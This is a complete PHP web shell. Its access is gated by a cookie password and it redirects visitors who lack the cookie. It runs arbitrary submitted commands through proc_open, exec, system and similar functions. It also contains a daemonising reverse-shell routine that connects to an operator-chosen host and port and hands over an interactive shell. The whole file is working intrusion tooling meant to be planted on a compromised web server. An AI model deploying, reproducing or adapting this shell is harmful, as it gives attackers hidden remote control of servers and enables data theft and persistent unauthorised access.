<?php
// In case you need to change it for some reasons
$cookie_name = "shellpass"; 
$hash = '$2y$10$XwszxosNhO0kTQ3PSHo8i.vaTmXrqkGr2qsdSQ48Btl5rR6Jj.sg6';// Default pass "Trans rights are human rights !" (no quotes)

// Maps commands to a function name
$commands = [
    'revshell'  => 'show_revshell_form',
    'upload'    => 'show_upload_form', //Upload doesn't work atm, just wanted to test the array thing
    'osinfo'    => 'php_uname'
];
// Functions used for code execution 
$exec_functions = [ 
    "proc_open"     => "cmd_proc", // I like this one :3
    "exec"          => "exec", 
    "passthru"      => "passthru", 
    "system"        => "system", 
    "shell_exec"    => "shell_exec",
];

if(!isset($_COOKIE[$cookie_name])) {
    header('Location: www.kittenwar.com');
    exit;
}
if (!password_verify($_COOKIE[$cookie_name], $hash)) {
    echo("not the right password\n");
    echo("Here's the hash of yours so you can edit the script\n");
    echo(password_hash($_COOKIE[$cookie_name], PASSWORD_BCRYPT));
    echo("Now get lost :3");
    exit;
}

// El famoso Monke
function revshell($lhost, $lport) {
    set_time_limit(0);
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; sh -i';
    $daemon = 0;
    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            printit("ERROR: Can't fork");
            exit(1);
        }
    
        if ($pid) {
            exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
            printit("Error: Can't setsid()");
            exit(1);
        }
        $daemon = 1;
    } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }
    chdir("/");
    umask(0);

    // Open reverse connection
    $sock = fsockopen($lhost, $lport, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    printit("Successfully opened reverse shell to $lhost:$lport");
    while (1) {
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
            break;
        }

        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
            break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
            $input = fread($sock, $chunk_size);
            fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], $chunk_size);
            fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], $chunk_size);
            fwrite($sock, $input);
        }
    }
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

// Use proc_open to execute the command
function cmd_proc($cmd) {
    $descriptors = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w']  // stderr
    ];
    
    $process = proc_open($cmd, $descriptors, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);

        // Clean messy output
        $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
        $errors = htmlspecialchars($errors, ENT_QUOTES, 'UTF-8');

        // Close the pipes and the process
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        proc_close($process);
    }
    return $output."\n".$errors;
}

function show_revshell_form() {
    echo  "<form action=".htmlspecialchars($_SERVER["PHP_SELF"]).' method="post">
        Lhost: <input type="text" name="lhost"><br>
        Lport: <input type="text" name="lport"><br>
        <input type="submit">
    </form>';
}
function show_upload_form() {
    echo  "<form action=".htmlspecialchars($_SERVER["PHP_SELF"]).' enctype="multipart/form-data" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>';
}

function printit($s) {
    echo($s."\n");
}
function pretty_printit($s) {
    print_r($s);
}
?>
<html>
<style>
    body {
    background: #000000;
    color: #DDDDDD;
    }
    input {
        background: #111111;
        color: #FFF;
    }
    .footer {
        position: fixed;
        bottom: 0;
    }
    .main {
        min-height: calc(100vh - 4rem);
        background: #111111;
    }
</style>
<body>
<form method="POST" action="<?php echo basename($_SERVER['PHP_SELF']); ?>" style="width:100%;">
    <input type="text" name="command" placeholder="Enter your command" autofocus style="width: 70%;">
    <button type="submit" style="background: #111111;color: #FFF">Send</button>
</form>
<div class="main">
    <pre>
    <?php 
        // Either we reverse shell ()
        if (isset($_POST['lhost']) && isset($_POST['lport'])) {     
            $lhost = filter_var($_POST['lhost'], FILTER_VALIDATE_IP);
            $lport = filter_var($_POST['lport'], FILTER_VALIDATE_INT); 
            revshell($lhost, $lport); // Call the monke

        // Either we execute commands as a webshell
        } elseif (isset($_POST['command'])) {
            $cmd = $_POST['command'];
            printit($cmd);

            // If the command is in the custom commands array, execute the corresponding function
            if (array_key_exists($cmd, $commands)) {
                $commands[$cmd]();
            } else {
                foreach($exec_functions as $checkfn => $execfn){
                    if(function_exists($checkfn)) {
                        pretty_printit($exec_functions[$checkfn]($cmd));
                        break;
                    } elseif( !next( $exec_functions ) ) {
                        printit('Out of functions to try :c');
                    }
                }
            }
        }      
    ?>
    </pre>
</div>
</body>
</html>
